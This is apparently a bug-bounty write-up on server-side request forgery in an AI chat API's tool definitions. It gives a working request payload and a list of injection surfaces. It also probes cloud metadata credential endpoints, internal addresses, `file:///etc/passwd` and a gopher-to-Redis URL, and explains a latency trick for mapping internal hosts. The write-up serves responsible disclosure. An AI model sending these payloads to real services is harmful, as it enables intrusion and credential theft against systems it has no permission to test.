# SSRF via remote JSON-Schema `$ref` in LLM tool definitions

Verified live 2026-10-25 on Proton Lumo (`POST https://lumo.proton.me/api/ai/v1/chat/completions`).
Confirmed: 14 distinct payloads -> 27 collaborator (interactsh) callbacks, 0 failures, 12 distinct
target-egress IPs, reproduced with **no Authorization header, no session cookie, no account**.

## 1. Why this class exists

[OI]-style chat endpoints accept `tools` / functions with a JSON Schema for arguments. Many
implementations resolve that schema — including remote `$ref` — **before** model invocation, so the
server performs an outbound fetch driven entirely by attacker JSON. No prompt injection, no model
compliance, no user interaction. It is plain SSRF hiding behind the AI feature.

Sibling surfaces to try, in order:
1. `tools[].function.parameters` (most common)
2. `tools[].function.parameters.properties.<x>.$ref` (nested)
3. `$schema` key inside `parameters`
4. `response_format.json_schema` / structured-output schemas
5. `tool_choice` / function-calling variants, and the `stream: true` code path (often a separate
   fetch implementation)
6. sibling endpoints from the SPA bundle: `/feedback`, `/assets/*`, image/attach handlers

## 2. Working payload

```json
POST /api/ai/v1/chat/completions
Accept: application/json
Content-Type: application/json
x-pm-appversion: web-lumo@1.3.0          // whatever the SPA sends; server rejects without it

{"model":"lumo-lite","max_tokens":4,"stream":false,
 "messages":[{"role":"user","content":"hi"}],
 "tools":[{"type":"function","function":{"name":"t","description":"d",
   "parameters":{"$ref":"https://<your-oast-host>/poc.json"}}}]}
```

`description` is **mandatory**. Drop it and the body fails untagged-enum validation
(`data did not match any variant of untagged enum IncomingToolSpec`) and **no fetch happens** —
that is your negative control, and it is what proves the fetch is caused by schema resolution
rather than by malformed-request handling.

Observed request from the target: `GET /poc.json HTTP/2.0`, headers `Host` + `Accept: */*` only.
No cookies, no Authorization, no credentials forwarded. Each payload produced **two** callbacks
from different IPs => two fetch paths in their stack; report that, it is useful to the vendor.

## 3. Characterise the oracle before claiming impact

Test what the fetched document must be, using httpbin (all remote docs return HTTP 200, so a
500 from the API is about CONTENT, not about the remote status):

| remote document | API result |
|---|---|
| `https://httpbin.org/json` (plain JSON object) | 200 accepted |
| base64 of a real `{"type":"object","properties":{...}}` | 200 accepted |
| base64 of `{"not":"a schema"}` (invalid keyword value) | 500 rejected |
| `/html`, `/xml`, `/image/png` (200, non-JSON) | 500 rejected |
| `/status/200`, `/status/204`, `/status/404`, `/status/500` (no body) | 500 rejected |

So the oracle is **schema validity**, not "JSON parses". Saying "JSON oracle" in a report is an
over-claim a triager can disprove in one request.

Always run a **reflection test**: put a unique marker inside the fetched schema and confirm it never
appears in the response. If it does not, this is a boolean oracle, NOT a read primitive — write the
report that way.

## 4. Escalation ladder + what the measured floor/ceiling looked like

Run each twice; classify by latency.

| target | reading |
|---|---|
| `http://127.0.0.1:<closed port>` | ~1.5-4 s, TCP RST => **closed** |
| `http://10.255.255.1/`, `http://10.0.0.1/` | ~30-32 s => **filtered** |
| `http://169.254.169.254/latest/meta-data/` | 3 s then 31 s => dialled, filtered |
| `http://169.254.170.2/v2/credentials` (ECS), `169.254.170.23` (EKS pod identity) | 31 s => filtered |
| `http://100.100.100.200/` (Alibaba), `http://192.0.0.192/` (Oracle) | 31-32 s => filtered |
| `http://metadata.google.internal/`, `http://kubernetes.default.svc/` | 1.4-2.4 s => name did not resolve |
| `file:///etc/passwd`, `gopher://127.0.0.1:6379/` | ~1.5 s => scheme refused |
| `https://httpbin.org/redirect-to?url=https://<oast>/x` | oast sees `/x` => **redirects followed** |

Closed-vs-filtered latency split = a working internal host/port classifier for an unauthenticated
attacker. Loopback + docker bridge (`172.17.0.1`) all resettable is the tell that the fetcher runs
in an isolated namespace with no local listeners.

Enumerate *every* cloud metadata endpoint, not just 169.254.169.254. Getting zero credentials is a
legitimate, reportable negative that caps severity — say "blind SSRF with boolean oracle", do not
imply credential theft.

## 5. Report framing that survived review

- Lead with "no account, no token, no cookie" only if you actually sent a header-less request and
  captured the callback.
- Quantify: `N payloads / N callbacks / N distinct egress IPs`, with the researcher's own egress IP
  stated so the triager can see it differs.
- Separate PROVEN (arbitrary outbound GET, unauthenticated, redirect-following, no quota cost,
  host/port discrimination) from NOT PROVEN (reading internal content).
- Include the negative control (missing `description` => no fetch) — it pre-empts the
  "your request was malformed so we fixed it" rebuttal.
- Severity floor that held: Medium. It becomes High only with internal content or credentials.

## 6. Bundle-mapping note

Enumerate the SPA's endpoint templates before declaring "only one entry point":
`grep -o 'url:\s*[`"][^`"]*' *.js | sort -u` over every chunk. On Lumo that yielded 300 templates
and proved there is no separate `ai/v1/images` endpoint (the `images` quota is spent through
`chat/completions`). Without that pass, "one endpoint" in the report would be a guess.
